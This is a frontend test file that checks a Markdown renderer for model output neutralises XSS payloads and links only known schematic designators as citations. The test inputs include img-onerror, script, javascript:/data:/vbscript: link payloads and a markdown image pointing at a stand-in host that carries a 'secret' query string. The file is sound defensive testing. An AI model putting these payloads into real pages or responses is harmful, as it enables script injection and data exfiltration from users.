import { fireEvent, render, screen } from '@testing-library/react'
import { afterEach, describe, expect, it } from 'vitest'

import { Markdown } from './Markdown'
import type { Designator, DrawingSummary } from '@/api/types'
import { buildLookup } from '@/lib/designators'
import { useAppStore } from '@/stores/appStore'

/**
 * Plan §8, the XSS row.
 *
 * The answer is model output rendered as HTML, so these are the assertions that stand
 * between "a schematic Q&A demo" and "an XSS hole with a schematic theme". They test the
 * component the app actually uses, not a stubbed renderer — the whole failure mode being
 * guarded against is somebody adding `rehype-raw` later because a table looked wrong.
 */
describe('Markdown', () => {
  it('renders an img tag as inert text, never as an element', () => {
    const { container } = render(<Markdown>{'<img src=x onerror=alert(1)>'}</Markdown>)
    expect(container.querySelector('img')).toBeNull()
    // The payload survives as *escaped text* (`&lt;img …`), which is the safe outcome — so
    // assert on the DOM, not on the HTML string: no element carries the handler.
    expect(container.querySelector('[onerror]')).toBeNull()
    expect([...container.querySelectorAll('*')].every((el) => !el.getAttributeNames().some((a) => a.startsWith('on')))).toBe(true)
    expect(container.textContent).toContain('<img src=x onerror=alert(1)>')
  })

  it('never produces a script node', () => {
    const { container } = render(<Markdown>{'<script>alert(1)</script>'}</Markdown>)
    expect(container.querySelector('script')).toBeNull()
    expect(container.innerHTML).not.toContain('<script')
  })

  it('strips a javascript: link rather than rendering an anchor', () => {
    const { container } = render(<Markdown>{'[click me](javascript:alert(1))'}</Markdown>)
    expect(container.querySelector('a')).toBeNull()
    expect(container.innerHTML.toLowerCase()).not.toContain('javascript:')
    expect(screen.getByText('click me')).toBeTruthy()
  })

  it('strips data: and vbscript: links too', () => {
    const { container } = render(
      <Markdown>{'[a](data:text/html,<script>1</script>) and [b](vbscript:msgbox)'}</Markdown>,
    )
    expect(container.querySelectorAll('a')).toHaveLength(0)
  })

  it('keeps http and https links, but makes them safe to click', () => {
    const { container } = render(<Markdown>{'[ok](https://example.com/x)'}</Markdown>)
    const anchor = container.querySelector('a')!
    expect(anchor.getAttribute('href')).toBe('https://example.com/x')
    expect(anchor.getAttribute('rel')).toContain('noopener')
    expect(anchor.getAttribute('target')).toBe('_blank')
  })

  it('renders a markdown image as alt text only, so nothing is fetched', () => {
    const { container } = render(<Markdown>{'![leak](https://evil.test/a?q=secret)'}</Markdown>)
    expect(container.querySelector('img')).toBeNull()
    expect(container.textContent).toContain('leak')
    expect(container.innerHTML).not.toContain('evil.test')
  })

  it('still renders the things an answer actually needs', () => {
    const { container } = render(
      <Markdown>{'| Wire | Net |\n|---|---|\n| `W047` | 110 |\n\n**bold**'}</Markdown>,
    )
    expect(container.querySelector('table')).not.toBeNull()
    expect(container.querySelector('code')?.textContent).toBe('W047')
    expect(container.querySelector('strong')?.textContent).toBe('bold')
  })
})

/**
 * The clickable half of bidirectional citation, tested here rather than beside it, because the
 * contract it has to keep is *this file's* contract: the text being matched is model output.
 *
 * The rule is an allowlist lookup against the server's designator index — never a pattern over
 * the answer. `W999` below has the exact shape of a wire id and must stay inert, because "the
 * model wrote something that looks like an id" is not evidence that it is one.
 */
describe('Markdown citations', () => {
  const CR_BP: Designator = {
    id: 'CR-BP', kind: 'component', label: 'relay — Run bypass relay.', on_sheet: true,
    members: ['CR-BP'], point: [861, 679], rect: [861, 679, 861, 679],
  }
  const OFF_SHEET: Designator = {
    id: 'UPSTREAM-MACHINE', kind: 'component', label: 'external — the upstream machine.',
    on_sheet: true, members: ['UPSTREAM-MACHINE'], point: null, rect: null,
  }

  function arm(options: { tiles?: boolean } = {}) {
    const index = { drawing_number: 'x', counts: {}, located: 1, entries: [CR_BP, OFF_SHEET] }
    useAppStore.setState({
      designators: index,
      byToken: buildLookup(index),
      drawing: { tiles: { count: options.tiles === false ? 0 : 4 } } as DrawingSummary,
      selection: null,
      activeTabId: 'ask',
    })
  }

  afterEach(() =>
    useAppStore.setState({ designators: null, byToken: new Map(), drawing: null,
                           selection: null, activeTabId: 'ask' }),
  )

  it('turns an identifier the server published into a button, and points the drawing at it', () => {
    arm()
    render(<Markdown>{'The coil of `CR-BP` is de-energised.'}</Markdown>)

    const button = screen.getByRole('button', { name: 'CR-BP' })
    fireEvent.click(button)

    expect(useAppStore.getState().selection).toMatchObject({
      kind: 'component', id: 'CR-BP', origin: 'text',
    })
    // The reader has to end up looking at the drawing, or the click did nothing visible.
    expect(useAppStore.getState().activeTabId).toBe('drawing')
  })

  it('re-pans on a second click of the same citation', () => {
    arm()
    render(<Markdown>{'`CR-BP`'}</Markdown>)
    fireEvent.click(screen.getByRole('button', { name: 'CR-BP' }))
    const first = useAppStore.getState().selection!.nonce
    fireEvent.click(screen.getByRole('button', { name: 'CR-BP' }))
    // Same target, new instruction. Without the nonce the viewer would sit still, which reads
    // as a broken link once the reader has dragged the sheet somewhere else.
    expect(useAppStore.getState().selection!.nonce).toBe(first + 1)
  })

  it('leaves a code span the index does not know as plain text', () => {
    arm()
    const { container } = render(
      <Markdown>{'the wire `W999` in `circuit_logic.json` and `nets[]`'}</Markdown>,
    )
    expect(container.querySelectorAll('button')).toHaveLength(0)
    expect(container.querySelectorAll('code')).toHaveLength(3)
  })

  it('leaves an id with no location on the sheet as plain text', () => {
    // Citable, not clickable: there is nowhere on this sheet to fly to, and a button that
    // pans nowhere is a lie about what the drawing contains.
    arm()
    const { container } = render(<Markdown>{'`UPSTREAM-MACHINE` closes the loop'}</Markdown>)
    expect(container.querySelectorAll('button')).toHaveLength(0)
  })

  it('makes nothing clickable when there is no drawing to click through to', () => {
    arm({ tiles: false })
    const { container } = render(<Markdown>{'`CR-BP`'}</Markdown>)
    expect(container.querySelectorAll('button')).toHaveLength(0)
    expect(container.querySelector('code')?.textContent).toBe('CR-BP')
  })

  it('never turns a fenced code block into citations', () => {
    arm()
    const { container } = render(<Markdown>{'```\nCR-BP\n```'}</Markdown>)
    expect(container.querySelector('pre')).not.toBeNull()
    expect(container.querySelectorAll('button')).toHaveLength(0)
  })
})
